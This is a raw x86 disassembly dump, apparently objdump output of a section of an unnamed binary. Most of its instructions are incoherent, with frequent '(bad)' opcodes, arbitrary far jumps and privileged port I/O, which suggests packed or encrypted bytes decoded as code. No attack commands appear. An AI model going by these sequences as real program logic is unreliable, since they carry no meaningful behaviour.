  416d34:	jle    0x416cd3
  416d36:	cdq    
  416d37:	sahf   
  416d38:	mov    dl,0xa8
  416d3a:	loope  0x416cc2
  416d3c:	xor    eax,0x77eceb2e
  416d41:	jmp    FWORD PTR [ebx]
  416d43:	inc    edi
  416d44:	mov    eax,ds:0x3fbc0122
  416d49:	inc    ebx
  416d4a:	jmp    0x6c356666
  416d4f:	sbb    esi,DWORD PTR [edi+0x1e7757d6]
  416d55:	jae    0x416cee
  416d57:	lahf   
  416d58:	jp     0x416d77
  416d5a:	setne  BYTE PTR [edx+0x1f]
  416d5e:	imul   edi,DWORD PTR [edi],0xffffff95
  416d61:	stc    
  416d62:	inc    eax
  416d63:	rol    BYTE PTR [eax],1
  416d65:	dec    edi
  416d66:	popa   
  416d67:	xor    DWORD PTR ds:0xdd59696b,esp
  416d6d:	loop   0x416dc4
  416d6f:	push   es
  416d70:	sar    DWORD PTR ds:0xe0d6616d,0xa3
  416d77:	push   eax
  416d78:	sbb    BYTE PTR [ecx],ch
  416d7a:	jae    0x416dcf
  416d7c:	jg     0x416df5
  416d7e:	cwde   
  416d7f:	mov    BYTE PTR [eax+0x72e823d3],cl
  416d85:	lods   eax,DWORD PTR ds:[esi]
  416d86:	adc    al,0xce
  416d88:	(bad)  
  416d89:	jmp    0xde7fd439
  416d8e:	add    eax,0x20350e33
  416d93:	pusha  
  416d94:	or     eax,0x65ca908a
  416d99:	mov    bh,0xb9
  416d9b:	mov    dl,0xe0
  416d9d:	add    DWORD PTR [ebp+0x3b],ebx
  416da0:	rcr    BYTE PTR [ebp-0x7b],1
  416da3:	or     al,0x1e
  416da5:	push   0xffffffe5
  416da7:	(bad)  
  416da8:	mov    eax,0x7e32642
  416dad:	xchg   esi,eax
  416dae:	ins    BYTE PTR es:[edi],dx
  416daf:	clc    
  416db0:	pop    esp
  416db1:	inc    edx
  416db2:	fnsave [ecx]
  416db4:	clc    
  416db5:	jge    0x416da6
  416db7:	in     al,0x87
  416db9:	(bad)  
  416dba:	jmp    0xd51f:0xe57d5348
  416dc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416dc2:	in     eax,dx
  416dc3:	enter  0x1f8e,0xa4
  416dc7:	rcr    BYTE PTR [edi],cl
  416dc9:	inc    eax
  416dca:	imul   edi,DWORD PTR [ecx-0x4a],0xffffffe4
  416dce:	ins    BYTE PTR es:[edi],dx
  416dcf:	pop    ss
  416dd0:	pop    esp
  416dd1:	or     eax,0x46440abf
  416dd6:	es or  eax,0xe11e3494
  416ddc:	test   DWORD PTR [esp+edi*1],ecx
  416ddf:	call   0xd1f6097f
  416de4:	pop    ebp
  416de5:	gs das 
  416de7:	add    bh,bh
  416de9:	jmp    FWORD PTR [ecx+0x3fb205c3]
  416def:	inc    esp
  416df0:	inc    esp
  416df1:	xor    ebx,DWORD PTR [edx-0x33]
  416df4:	jns    0x416e04
  416df6:	retf   0xe54a
  416df9:	xchg   ebx,eax
  416dfa:	mov    al,0xad
  416dfc:	jbe    0x416dbb
  416dfe:	or     ecx,esp
  416e00:	jle    0x416da3
  416e02:	push   ecx
  416e03:	xchg   ecx,eax
  416e04:	call   0x139d01a0
  416e09:	xchg   ecx,eax
  416e0a:	push   ds
  416e0b:	push   ebp
  416e0c:	adc    DWORD PTR [eax-0x3b],eax
  416e0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e10:	push   esi
  416e11:	sub    eax,DWORD PTR [esp+ebx*4+0x59020cc7]
  416e18:	std    
  416e19:	fisttp WORD PTR [edi]
  416e1b:	cmp    al,0x45
  416e1d:	inc    esp
  416e1e:	jp     0x416e32
  416e20:	inc    edi
  416e21:	and    dl,0xba
  416e24:	arpl   si,sp
  416e26:	(bad)  [eax-0x1e]
  416e29:	and    dh,BYTE PTR [edi-0x77c34294]
  416e2f:	call   0xdf:0x563f7ec9
	...
  416e96:	mov    edi,0xae6d8e19
  416e9b:	(bad)  
  416e9c:	(bad)  
  416e9d:	(bad)  
  416e9f:	fstp   QWORD PTR [edx+ecx*8-0x5f2bbb1d]
  416ea6:	int    0xef
  416ea8:	add    BYTE PTR [eax],al
  416eaa:	pop    es
  416eab:	add    DWORD PTR [eax],eax
  416ead:	add    BYTE PTR [ecx],al
  416eaf:	mov    DWORD PTR [eax],edi
  416eb1:	inc    ebx
  416eb2:	push   ebx
  416eb3:	mov    bh,BYTE PTR [ebx-0x51]
  416eb6:	popf   
  416eb7:	aam    0x0
  416eb9:	mov    BYTE PTR [ecx+0x67ffd3cd],cl
  416ebf:	sbb    edi,edx
  416ec1:	sub    DWORD PTR [ecx],0xffffffda
  416ec4:	(bad)  
  416ec5:	shr    BYTE PTR [edx-0x61],0xf9
  416ec9:	pop    esp
  416eca:	adc    ch,ch
  416ecc:	test   eax,0x30b2b9f1
  416ed1:	ja     0x416e58
  416ed3:	pop    ds
  416ed4:	inc    eax
  416ed5:	add    ecx,DWORD PTR [edi]
  416ed7:	xor    al,0x71
  416ed9:	add    al,0x92
  416edb:	ins    BYTE PTR es:[edi],dx
  416edc:	loope  0x416eca
  416ede:	inc    edx
  416edf:	mov    ch,0x88
  416ee1:	fisubr DWORD PTR [ecx+0x16]
  416ee4:	fnstcw WORD PTR [edx+esi*4-0x5f54dd6d]
  416eeb:	jnp    0x416f27
  416eed:	or     ebx,DWORD PTR [eax-0x5f383d68]
  416ef3:	pop    ds
  416ef4:	dec    ecx
  416ef5:	(bad)  
  416ef6:	mov    edx,0x6c6cff70
  416efb:	dec    eax
  416efc:	or     ebp,DWORD PTR [edx]
  416efe:	push   edx
  416eff:	add    al,0x78
  416f01:	test   ebp,edi
  416f03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f04:	sub    dl,dh
  416f06:	idiv   DWORD PTR [ebp-0x43623cf8]
  416f0c:	fs lock in eax,dx
  416f0f:	add    BYTE PTR [eax+0x4],ah
  416f12:	pop    eax
  416f13:	sub    ah,ah
  416f15:	mov    bh,0x50
  416f17:	scas   eax,DWORD PTR es:[edi]
  416f18:	dec    ebx
  416f19:	inc    ebp
  416f1a:	or     ebx,eax
  416f1c:	out    0x95,eax
  416f1e:	daa    
  416f1f:	inc    edx
  416f20:	imul   esi,esi,0xffffffd8
  416f23:	lea    ebp,[eax-0x7fabc284]
  416f29:	and    cl,BYTE PTR [eax+0x52]
  416f2c:	or     bl,BYTE PTR [esi+0x15]
  416f2f:	fld    TBYTE PTR [ecx-0x3f3e62b7]
  416f35:	std    
  416f36:	mov    ds:0x6d6d9eab,eax
  416f3b:	sbb    DWORD PTR es:[edi-0x51],edi
  416f3f:	and    DWORD PTR [ecx+0x1e],0xf0337d7a
  416f46:	outs   dx,DWORD PTR ds:[esi]
  416f47:	sbb    BYTE PTR [ecx-0x29ed28e6],bh
  416f4d:	inc    eax
  416f4e:	sahf   
  416f4f:	cld    
  416f50:	retf   
  416f51:	sub    DWORD PTR [ecx+0x772c967b],ebx
  416f57:	pop    ebp
  416f58:	xchg   ebx,ebp
  416f5a:	icebp  
  416f5b:	stos   BYTE PTR es:[edi],al
  416f5c:	shl    ebp,1
  416f5e:	inc    ecx
  416f5f:	sub    eax,0xbbfe2465
  416f64:	sub    dl,BYTE PTR [esi-0x3]
  416f67:	and    dh,cl
  416f69:	loope  0x416f89
  416f6b:	ins    BYTE PTR es:[edi],dx
  416f6c:	mov    ds:0x1588ebfb,eax
  416f71:	call   0x3df:0x26984943
  416f78:	shl    BYTE PTR [edi-0x4a848fd9],cl
  416f7e:	and    BYTE PTR [esp+edx*2+0x35],al
  416f82:	popf   
  416f83:	sub    ch,ah
  416f85:	mov    ebx,0x704ef163
  416f8a:	int    0xdf
  416f8c:	mov    gs,ebp
  416f8e:	dec    ebp
  416f8f:	out    0x27,al
  416f91:	or     esi,esi
  416f93:	push   0x24
  416f95:	outs   dx,DWORD PTR ds:[esi]
  416f96:	in     eax,0x3b
  416f98:	adc    eax,0xfe7fb3ab
  416f9d:	sbb    esi,ebx
  416f9f:	push   eax
  416fa0:	pop    eax
  416fa1:	jmp    0x416fe9
  416fa3:	fisub  DWORD PTR [edx]
  416fa5:	arpl   WORD PTR [edi],bp
  416fa7:	mov    cs,ebx
  416fa9:	push   edx
  416faa:	cmc    
  416fab:	packsswb mm3,mm6
  416fae:	shl    BYTE PTR [edx],cl
  416fb0:	fs xor eax,0x1dd654
	...
  417016:	jbe    0x417045
  417018:	push   ebp
  417019:	inc    ecx
  41701a:	pop    edi
  41701b:	jns    0x417093
  41701d:	aas    
  41701e:	lods   al,BYTE PTR ds:[esi]
  41701f:	fmul   QWORD PTR [eax-0x50]
  417022:	vmread DWORD PTR [esi-0x49],ecx
  417026:	aam    0xf0
  417028:	add    BYTE PTR [eax],al
  41702a:	pop    es
  41702b:	add    DWORD PTR [eax],eax
  41702d:	add    BYTE PTR [esi-0x4],bl
  417030:	push   0xfffffff7
  417032:	cmp    ecx,DWORD PTR [eax]
  417034:	jp     0x417096
  417036:	(bad)  
  417037:	ss mov esp,esi
  41703a:	retf   
  41703b:	ds scas eax,DWORD PTR es:[edi]
  41703d:	cmc    
  41703e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41703f:	ins    DWORD PTR es:[edi],dx
  417040:	dec    esi
  417041:	sbb    ebp,DWORD PTR cs:[ecx]
  417044:	mov    esi,0xe35dea59
  417049:	ja     0x416fe6
  41704b:	das    
  41704c:	pop    ecx
  41704d:	xor    edi,DWORD PTR [ebp-0x3a729b]
  417053:	add    eax,0x41549e76
  417058:	mov    dl,0x15
  41705a:	xchg   ecx,eax
  41705b:	mov    ch,dl
  41705d:	adc    DWORD PTR [esi-0x5a283fb2],ebx
  417063:	enter  0x50b2,0x3e
  417067:	enter  0x698a,0x60
  41706b:	rcr    BYTE PTR [esi],0xad
  41706e:	mov    WORD PTR [eax],gs
  417070:	mov    ah,0x27
  417072:	jle    0x417088
  417074:	ss jl  0x417007
  417077:	bound  esp,QWORD PTR [edi+esi*2-0x4e]
  41707b:	jl     0x41707f
  41707d:	aad    0xe8
  41707f:	icebp  
  417080:	sub    DWORD PTR [ecx+0x3aad8764],esp
  417086:	scas   al,BYTE PTR es:[edi]
  417087:	dec    ebp
  417088:	mov    ebx,0x57ad4bf9
  41708d:	jle    0x4170e4
  41708f:	in     eax,dx
  417090:	inc    ebx
  417091:	mov    cl,BYTE PTR [ebx-0x18ac91f8]
  417097:	xchg   esi,eax
  417098:	push   0xffffffb4
  41709a:	mov    DWORD PTR [ebp+0x52],ecx
  41709d:	add    dl,al
  41709f:	jge    0x41702a
  4170a1:	mov    bh,0x5a
  4170a3:	icebp  
  4170a4:	popa   
  4170a5:	fst    DWORD PTR [eax-0x6a]
  4170a8:	push   ss
  4170a9:	jecxz  0x417060
  4170ab:	and    DWORD PTR [ebp-0x2e741375],ecx
  4170b1:	push   eax
  4170b2:	xchg   esi,eax
  4170b3:	bound  esi,QWORD PTR [ecx]
  4170b5:	xchg   ebp,eax
  4170b6:	push   0x6f
  4170b8:	repz or al,0xb2
  4170bb:	daa    
  4170bc:	mov    al,0x46
  4170be:	pop    ecx
  4170bf:	mov    ds:0x2b3ee06e,eax
  4170c4:	or     BYTE PTR [edx+edi*4+0x5d],ch
  4170c8:	mov    ?,WORD PTR [ebp-0x24b37d3e]
  4170ce:	lahf   
  4170cf:	sbb    eax,0x8ae15504
  4170d4:	adc    eax,0x527286bf
  4170d9:	mov    bh,0xfb
  4170db:	adc    DWORD PTR [edx+0x237753d0],eax
  4170e1:	jbe    0x4170bb
  4170e3:	jbe    0x417123
  4170e5:	push   edx
  4170e6:	cmp    edx,DWORD PTR [eax-0x60]
  4170e9:	loop   0x417073
  4170eb:	add    BYTE PTR ds:0x692d9433,cl
  4170f1:	pusha  
  4170f2:	int    0x37
  4170f4:	dec    eax
  4170f5:	inc    esi
  4170f6:	or     al,0xed
  4170f8:	push   edi
  4170f9:	test   BYTE PTR [edi-0x28],dh
  4170fc:	xchg   edi,eax
  4170fd:	jecxz  0x4170a5
  4170ff:	xchg   DWORD PTR [edx],ecx
  417101:	lahf   
  417102:	es clc 
  417104:	iret   
  417105:	mov    esp,0x480bc010
  41710a:	add    al,0xc1
  41710c:	mov    eax,0x43c4aa75
  417111:	rol    BYTE PTR [ebx-0x3f744957],cl
  417117:	xor    edi,edi
  417119:	cs aas 
  41711b:	inc    edx
  41711c:	ds jl  0x4170d9
  41711f:	push   ss
  417120:	jp     0x41710d
  417122:	push   eax
  417123:	adc    al,0xbc
  417125:	push   ecx
  417126:	dec    eax
  417127:	or     DWORD PTR [ecx-0x1bbf05e5],edi
  41712d:	ins    DWORD PTR es:[edi],dx
  41712e:	mov    ds:0x619e4d1e,eax
  417133:	loopne 0x417121
	...
  417195:	add    BYTE PTR [esi-0xe58fe7],ah
  41719b:	jnp    0x41718b
  41719d:	mov    ebp,0x5dd8ff3
  4171a2:	jl     0x417167
  4171a4:	pop    ebx
  4171a5:	dec    esi
  4171a6:	fcomi  st,st(1)
  4171a8:	add    BYTE PTR [eax],al
  4171aa:	pop    es
  4171ab:	add    DWORD PTR [eax],eax
  4171ad:	add    BYTE PTR [esp+ebp*2+0x51],bh
  4171b1:	pushf  
  4171b2:	in     eax,0x0
  4171b4:	mov    dh,0x5e
  4171b6:	and    eax,0x633cfa43
  4171bb:	xchg   BYTE PTR [edi-0x4d],al
  4171be:	mov    ecx,DWORD PTR [edi+0x73]
  4171c1:	push   ebx
  4171c2:	inc    eax
  4171c3:	daa    
  4171c4:	pop    edx
  4171c5:	mov    DWORD PTR ds:0xcaeeb9e6,eax
  4171cb:	jb     0x41714e
  4171cd:	xchg   ebp,eax
  4171ce:	je     0x417199
  4171d0:	sbb    eax,0x1a82cc
  4171d5:	push   es
  4171d6:	(bad)  
  4171d7:	pusha  
  4171d8:	dec    esi
  4171d9:	aam    0x1c
  4171db:	mov    dh,0xe1
  4171dd:	iret   
  4171de:	arpl   WORD PTR [edi-0x52],bx
  4171e1:	xchg   DWORD PTR [ebx+0x65],ecx
  4171e4:	ret    
  4171e5:	addr16 clc 
  4171e7:	xchg   edx,eax
  4171e8:	push   edi
  4171e9:	or     ah,bl
  4171eb:	je     0x417241
  4171ed:	jge    0x4171c8
  4171ef:	jl     0x4171b0
  4171f1:	aam    0xd9
  4171f3:	mov    bh,0x6c
  4171f5:	jle    0x417211
  4171f7:	add    eax,0x64359866
  4171fc:	enter  0x6d52,0xbc
  417200:	ss mov cl,0x31
  417203:	lahf   
  417204:	push   0x877259f3
  417209:	dec    esp
  41720a:	jbe    0x4171a9
  41720c:	cdq    
  41720d:	js     0x41726d
  41720f:	add    ebp,ecx
  417211:	pop    edx
  417212:	push   ss
  417213:	iret   
  417214:	enter  0x7360,0xa1
  417218:	mov    eax,ds:0x25d6bf45
  41721d:	mov    edx,0xa3692d16
  417222:	mov    ah,0x21
  417224:	mov    ch,0xba
  417226:	repz (bad) 
  417229:	mov    dl,0x5
  41722b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41722c:	(bad)  
  41722d:	les    ecx,FWORD PTR [edi]
  41722f:	cmp    al,0x7c
  417231:	data16 add BYTE PTR [edx+0x22],dl
  417235:	or     eax,0xe737a6d5
  41723a:	fidiv  WORD PTR [ebp-0x62]
  41723d:	jo     0x41729f
  41723f:	jg     0x41723e
  417241:	jp     0x417207
  417243:	mov    eax,0x39aca79e
  417248:	xor    edi,DWORD PTR [ebx+0x51f1e3a9]
  41724e:	push   esp
  41724f:	pop    ebx
  417250:	loop   0x417279
  417252:	sbb    BYTE PTR [edi+0x567fdbb1],ah
  417258:	pop    ebp
  417259:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41725a:	or     eax,0xe0c6bb2
  41725f:	test   eax,0x6dbbade
  417264:	jb     0x41725a
  417266:	sub    BYTE PTR [ebp+0x5f],bl
  417269:	mov    dl,0x45
  41726b:	test   dl,al
  41726d:	push   ds
  41726e:	lods   eax,DWORD PTR ds:[esi]
  41726f:	sub    DWORD PTR [eax+0x2b591bc6],esp
  417275:	mov    dh,0xc2
  417277:	fimul  DWORD PTR [edi+eax*1+0x2e7d24ab]
  41727e:	sub    edi,eax
  417280:	retf   0x7b82
  417283:	sbb    DWORD PTR [edx],eax
  417285:	cmc    
  417286:	cmp    al,BYTE PTR [edi]
  417288:	and    DWORD PTR [esi-0x3e206a55],ebx
  41728e:	sbb    al,0x87
  417290:	sbb    bh,BYTE PTR [ebx]
  417292:	ret    
  417293:	push   0x9cede3c8
  417298:	pop    ss
  417299:	mov    al,0x1a
  41729b:	xchg   ebx,eax
  41729c:	lds    ebp,FWORD PTR [ebx-0x3c]
  41729f:	fdiv   DWORD PTR [ebp-0x57418e61]
  4172a5:	cmp    BYTE PTR [edi+ebx*4],al
  4172a8:	push   ebx
  4172a9:	xor    DWORD PTR [ecx-0x64],edi
  4172ac:	lock (bad) 
  4172ae:	xor    bl,BYTE PTR [esi+edx*8-0x7f9c5841]
	...
  417315:	add    BYTE PTR [ecx-0x44],ch
  417318:	xlat   BYTE PTR ds:[ebx]
  417319:	pop    esi
  41731a:	xlat   BYTE PTR ds:[ebx]
  41731b:	jg     0x417306
  41731d:	mov    edi,0x85e5bf4a
  417322:	or     al,BYTE PTR [esi]
  417324:	cli    
  417325:	cmp    edx,esp
  417327:	repnz add BYTE PTR [eax],al
  41732a:	pop    es
  41732b:	add    DWORD PTR [eax],eax
  41732d:	add    BYTE PTR [ebp+esi*8+0x27692fb2],ah
  417334:	ror    esp,cl
  417336:	inc    eax
  417337:	cli    
  417338:	add    DWORD PTR [edi+0x1760c287],esp
  41733e:	push   ebp
  41733f:	adc    al,0x36
  417341:	imul   ecx,edi,0xd40b914f
  417347:	sbb    al,0x6b
  417349:	loope  0x417391
  41734b:	adc    al,0xcb
  41734d:	ja     0x417369
  41734f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417350:	nop
  417351:	out    0xec,al
  417353:	std    
  417354:	sub    DWORD PTR [ebx+0x1e4abe85],eax
  41735a:	xchg   edi,eax
  41735b:	ror    BYTE PTR [ebp+0x3d],1
  41735e:	ja     0x417345
  417360:	sub    eax,0x7fb6df7c
  417365:	(bad)  
  417366:	mov    al,0x69
  417368:	and    eax,DWORD PTR [edx]
  41736a:	mov    BYTE PTR [ebx+0x661eb0d8],cl
  417370:	jmp    0x4173a7
  417372:	push   esp
  417373:	pop    esi
  417374:	(bad)  
  417375:	xor    BYTE PTR [ebp-0x28],dl
  417378:	push   es
  417379:	mov    ebx,DWORD PTR [ebx+0x26592e77]
  41737f:	xchg   ecx,eax
  417380:	mov    esi,0xa1a0ae4b
  417385:	les    esi,FWORD PTR [eax+0x3c5ae759]
  41738b:	or     BYTE PTR [eax-0x77],0x89
  41738f:	or     al,0x77
  417391:	and    DWORD PTR [esi+0x24],0xa8ae3ce5
  417398:	push   ebp
  417399:	jmp    0x7383:0xb152868f
  4173a0:	or     cl,ch
  4173a2:	call   0x6948:0xf144b9a7
  4173a9:	sbb    eax,0x680bb5e4
  4173ae:	or     al,0xea
  4173b0:	push   ebp
  4173b1:	sub    DWORD PTR [ebx-0x4587ab51],ecx
  4173b7:	sbb    cl,BYTE PTR [ebp-0x22954a6e]
  4173bd:	daa    
  4173be:	retf   0x13e9
  4173c1:	pop    ebp
  4173c2:	icebp  
  4173c3:	sub    BYTE PTR [ecx],ah
  4173c5:	out    dx,al
  4173c6:	mov    WORD PTR [ebx+0x6f4a32ed],es
  4173cc:	(bad)  
  4173ce:	call   0x49b88325
  4173d3:	mov    WORD PTR [ebx],ss
  4173d5:	out    0x8c,eax
  4173d7:	enter  0xfae4,0x95
  4173db:	fisub  DWORD PTR [eax+0x49952e50]
  4173e1:	cs xchg cl,bh
  4173e4:	sub    al,0x2e
  4173e6:	out    0xd3,al
  4173e8:	cmp    BYTE PTR [esi-0x31b1f26c],0x99
  4173ef:	jmp    FWORD PTR [ebx+0x7cb5d40d]
  4173f5:	xor    bh,BYTE PTR [esi-0x7c]
  4173f8:	cli    
  4173f9:	or     eax,0xc52a5fc1
  4173fe:	int3   
  4173ff:	aaa    
  417400:	sti    
  417401:	or     bh,BYTE PTR [edi+eiz*1-0x77b8b17c]
  417408:	xchg   esp,eax
  417409:	mov    eax,ds:0x3b600034
  41740e:	(bad)  
  41740f:	xor    DWORD PTR [eax],edx
  417411:	loopne 0x417480
  417413:	outs   dx,BYTE PTR ds:[esi]
  417414:	adc    al,0xc
  417416:	data16 (bad) 
  417418:	leave  
  417419:	mov    BYTE PTR [ebp-0x5e],ch
  41741c:	xchg   edx,eax
  41741d:	mov    ebp,gs
  41741f:	rol    DWORD PTR [esi+0x75eaa3d7],0x18
  417426:	call   0x9559b974
  41742b:	hlt    
  41742c:	inc    esp
  41742d:	out    0x17,al
  41742f:	and    dl,BYTE PTR [ebx+0x55ecf5f]
	...
  417495:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  41749b:	fdivr  st(7),st
  41749d:	mov    edi,0x6bda61d2
  4174a2:	and    al,0x87
  4174a4:	test   BYTE PTR [esi-0x17],cl
  4174a7:	repz add BYTE PTR [eax],al
  4174aa:	pop    es
  4174ab:	add    DWORD PTR [eax],eax
  4174ad:	add    BYTE PTR [ebx-0x6b3f38],bl
  4174b3:	add    BYTE PTR [edi],dh
  4174b5:	sbb    cl,BYTE PTR [ecx]
  4174b7:	jmp    0x4833:0x576e80d3
  4174be:	not    edi
  4174c0:	cmp    BYTE PTR [esi-0x2d],dh
  4174c3:	xor    eax,0xa5c7acfc
  4174c8:	push   ds
  4174c9:	retf   0x9e3
  4174cc:	or     eax,0x21ebd957
  4174d1:	lock bound edi,QWORD PTR [esi+edx*1+0x41c576ed]
  4174d9:	sti    
  4174da:	adc    al,0xd0
  4174dc:	es pop ebp
  4174de:	sbb    BYTE PTR [eax+0x66ca34cb],dl
  4174e4:	sub    DWORD PTR [edx-0x2e],eax
  4174e7:	nop
  4174e8:	add    eax,0xf392d8a3
  4174ed:	or     BYTE PTR ds:0xda529739,ah
  4174f3:	sub    eax,0xb707aad8
  4174f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174f9:	mov    edi,0xe054f625
  4174fe:	xlat   BYTE PTR ds:[ebx]
  4174ff:	and    DWORD PTR ds:[ebx-0x1859ae7d],ecx
  417506:	inc    eax
  417507:	loop   0x417585
  417509:	sbb    dl,BYTE PTR [esi-0x73]
  41750c:	or     DWORD PTR [edx],edx
  41750e:	dec    esi
  41750f:	push   cs
  417510:	push   ecx
  417511:	fld    QWORD PTR [esi+0x2792c0e3]
  417517:	je     0x4174d2
  417519:	push   0xffffffb4
  41751b:	repnz daa 
  41751d:	bt     DWORD PTR [ecx+0x88d6a96],esi
  417524:	xchg   esp,eax
  417525:	jmp    0x417581
  417527:	test   eax,0x871159bc
  41752c:	test   ebx,eax
  41752e:	mov    edi,0x5b37a359
  417533:	pop    esp
  417534:	inc    eax
  417535:	loop   0x4174bc
  417537:	nop
  417538:	sbb    dl,dh
  41753a:	in     al,dx
  41753b:	and    dh,BYTE PTR [edx-0x4af3fd76]
  417541:	mov    BYTE PTR [edx-0x10],cl
  417544:	add    al,0xd4
  417546:	sub    ebx,DWORD PTR [ecx-0x10]
  417549:	pop    ss
  41754a:	scas   eax,DWORD PTR es:[edi]
  41754b:	dec    ebp
  41754c:	(bad)  
  41754d:	or     edi,DWORD PTR [esi]
  41754f:	cmp    DWORD PTR [edi+edi*4],0x64
  417553:	inc    esi
  417554:	lods   al,BYTE PTR ds:[esi]
  417555:	loop   0x417558
  417557:	cmp    al,0xdc
  417559:	sahf   
  41755a:	and    ch,BYTE PTR [eax-0x22]
  41755d:	cmp    DWORD PTR [edi+edx*1-0x3],0x5918b362
  417565:	hlt    
  417566:	loop   0x417506
  417568:	inc    esi
  417569:	jmp    0x469cb7db
  41756e:	mov    esp,0x160d4e8
  417573:	xor    al,BYTE PTR [ebp-0x3683b55e]
  417579:	mov    ebp,0x77444f01
  41757e:	xchg   ebx,eax
  41757f:	fisttp WORD PTR [ebx-0x77]
  417582:	(bad)  
  417583:	in     eax,0xfd
  417585:	lds    esi,FWORD PTR [ebx-0x42]
  417588:	mov    eax,0x807477e5
  41758d:	pop    ds
  41758e:	les    ecx,FWORD PTR [edi*1-0x3a6f08e2]
  417595:	cld    
  417596:	test   BYTE PTR [edx-0x346ea3b],bl
  41759c:	hlt    
  41759d:	inc    edi
  41759e:	(bad)  
  41759f:	sub    dl,BYTE PTR [esi]
  4175a1:	dec    DWORD PTR [edx-0x5e8ea91]
  4175a7:	xlat   BYTE PTR ds:[ebx]
  4175a8:	and    esp,DWORD PTR [ecx+0x3a]
  4175ab:	xchg   edi,eax
  4175ac:	and    DWORD PTR [eax],ebx
  4175ae:	pop    ebx
  4175af:	ss mov bh,0x87
  4175b2:	xor    ecx,edx
  4175b4:	jae    0x4175b6
	...
  417616:	test   eax,0xdf4fd367
  41761b:	(bad)  
  41761c:	mov    ebp,0x670b0ae7
  417621:	fsubr  DWORD PTR [esi-0xf5de37f]
  417627:	hlt    
  417628:	add    BYTE PTR [eax],al
  41762a:	pop    es
  41762b:	add    DWORD PTR [eax],eax
  41762d:	add    BYTE PTR [edx+0x275ac9cf],al
  417633:	out    dx,al
  417634:	cmp    eax,0xd102cba
  417639:	cmp    al,cl
  41763b:	repnz cmc 
  41763d:	pop    es
  41763e:	dec    esp
  41763f:	add    eax,0x82ed8718
  417644:	clc    
  417645:	or     esp,DWORD PTR [ebp+0x2a0f9377]
  41764b:	jmp    0xdde1:0xfc0803ec
  417652:	ret    
  417653:	rcl    DWORD PTR ss:[eax-0x55155fb5],0x34
  41765b:	and    DWORD PTR [edx-0x610cf199],edx
  417661:	add    ebp,DWORD PTR [esi+ebp*8-0x5dfd34b6]
  417668:	jle    0x41768c
  41766a:	sbb    al,0x74
  41766c:	push   0xffffff92
  41766e:	add    edi,edi
  417670:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  417672:	cwde   
  417673:	xor    al,0x54
  417675:	mov    esi,0xca2e89a
  41767a:	pop    ss
  41767b:	dec    eax
  41767c:	push   esi
  41767d:	cdq    
  41767e:	dec    ebx
  41767f:	hlt    
  417680:	nop
  417681:	stos   DWORD PTR es:[edi],eax
  417682:	fistp  WORD PTR [edi-0x64339998]
  417688:	cmc    
  417689:	jbe    0x4176f3
  41768b:	push   ds
  41768c:	jmp    0xc9d2:0xd2909d27
  417693:	scas   eax,DWORD PTR es:[edi]
  417694:	fld    DWORD PTR [eax]
  417696:	fcomp  QWORD PTR [edi+esi*2-0xfcd2ded]
  41769d:	push   ss
  41769e:	inc    edi
  41769f:	mov    eax,0xf915a8cc
  4176a4:	popf   
  4176a5:	xchg   edi,eax
  4176a6:	add    BYTE PTR [ebx+0x2df23980],cl
  4176ac:	es jmp 0x9720:0x5eb11c5f
  4176b4:	mov    ah,0x8c
  4176b6:	dec    ecx
  4176b7:	xor    esp,DWORD PTR [eax]
  4176b9:	xor    DWORD PTR [esi],edi
  4176bb:	push   esi
  4176bc:	push   edi
  4176bd:	sub    DWORD PTR [edi+0x75],edx
  4176c0:	fidiv  DWORD PTR [edx]
  4176c2:	aam    0x61
  4176c4:	sub    esp,0x10
  4176c7:	cdq    
  4176c8:	daa    
  4176c9:	add    bl,BYTE PTR [ecx+0x3ad7876e]
  4176cf:	ja     0x4176b1
  4176d1:	fadd   QWORD PTR [edi-0x6dcedce5]
  4176d7:	sbb    bh,BYTE PTR [ecx]
  4176d9:	xchg   dh,ch
  4176db:	pop    DWORD PTR [edx]
  4176dd:	lods   al,BYTE PTR ds:[esi]
  4176de:	mov    cl,0xf0
  4176e0:	fisubr WORD PTR [esi]
  4176e2:	inc    ebp
  4176e3:	and    al,0x5c
  4176e5:	arpl   WORD PTR [eax+0x5a7b5a38],bx
  4176eb:	cdq    
  4176ec:	pop    edi
  4176ed:	icebp  
  4176ee:	sub    DWORD PTR [ebx-0x6f],edx
  4176f1:	nop    ebp
  4176f4:	fsubr  st,st(3)
  4176f6:	fcmovnb st,st(0)
  4176f8:	dec    esp
  4176f9:	in     al,dx
  4176fa:	adc    al,0x7b
  4176fc:	adc    eax,0x451d1f79
  417701:	call   DWORD PTR [esi-0x22ea4067]
  417707:	sub    BYTE PTR [esi],cl
  417709:	jno    0x41771b
  41770b:	mov    edx,0x2c45e508
  417710:	pushf  
  417711:	sbb    edx,DWORD PTR [ecx+0x5969dd8c]
  417717:	ret    
  417718:	dec    ebp
  417719:	es mov cl,0xc3
  41771c:	ss ss test ah,al
  417720:	retf   
  417721:	cld    
  417722:	cwde   
  417723:	mov    al,ds:0xe0a9922b
  417728:	dec    esi
  417729:	sahf   
  41772a:	les    eax,FWORD PTR [ecx]
  41772c:	in     al,dx
  41772d:	neg    BYTE PTR [eax]
  41772f:	in     al,0x12
  417731:	lea    ebx,[eax+0x4b83]
	...
  417793:	add    BYTE PTR [eax],al
  417795:	add    cl,ch
  417797:	push   cs
  417798:	(bad)  
  417799:	pop    ss
  41779a:	push   edi
  41779c:	jmp    0xebcb2f9f
  4177a1:	sbb    DWORD PTR [ebp+ebp*8-0xa083d58],esp
  4177a8:	add    BYTE PTR [eax],al
  4177aa:	pop    es
  4177ab:	add    DWORD PTR [eax],eax
  4177ad:	add    BYTE PTR [edx+0x6b],bl
  4177b0:	leave  
  4177b1:	mov    cl,0x8e
  4177b3:	pop    esi
  4177b4:	xchg   edi,eax
  4177b5:	xor    DWORD PTR [ecx-0x48eec42b],ebx
  4177bb:	fidivr DWORD PTR [ebx]
  4177bd:	push   ds
  4177be:	dec    eax
  4177bf:	stos   BYTE PTR es:[edi],al
  4177c0:	mov    ecx,0xcf401cc2
  4177c5:	jbe    0x4177fa
